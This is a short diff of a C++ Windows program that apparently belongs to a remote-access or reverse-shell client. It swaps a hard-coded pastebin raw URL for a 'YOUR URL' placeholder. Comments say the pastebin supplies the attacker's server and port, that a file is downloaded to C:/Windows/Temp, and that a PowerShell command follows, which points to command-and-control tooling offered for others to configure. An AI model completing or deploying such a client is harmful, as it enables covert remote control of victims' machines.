@@ -1,5 +1,5 @@
 #include <iostream>
-#include <regv.h>
+#include "include/regv.h"
 #include <windows.h>
 #include <dirent.h>
 #include "include/behaviour.h"
@@ -32,7 +32,7 @@ int main(void){
     while (true){
 // --------------------------------------------------------------------------------------------
         // Raw of pastebin with server and port
-        string url = "https://pastebin.com/raw/T8t1hVC6";
+        string url = "https://pastebin.com/raw/*****"; // -< YOUR URL
         //Location where txt file will be downloaded
         string path = "C:/Windows/Temp/text.txt";
         //Command powershell v2
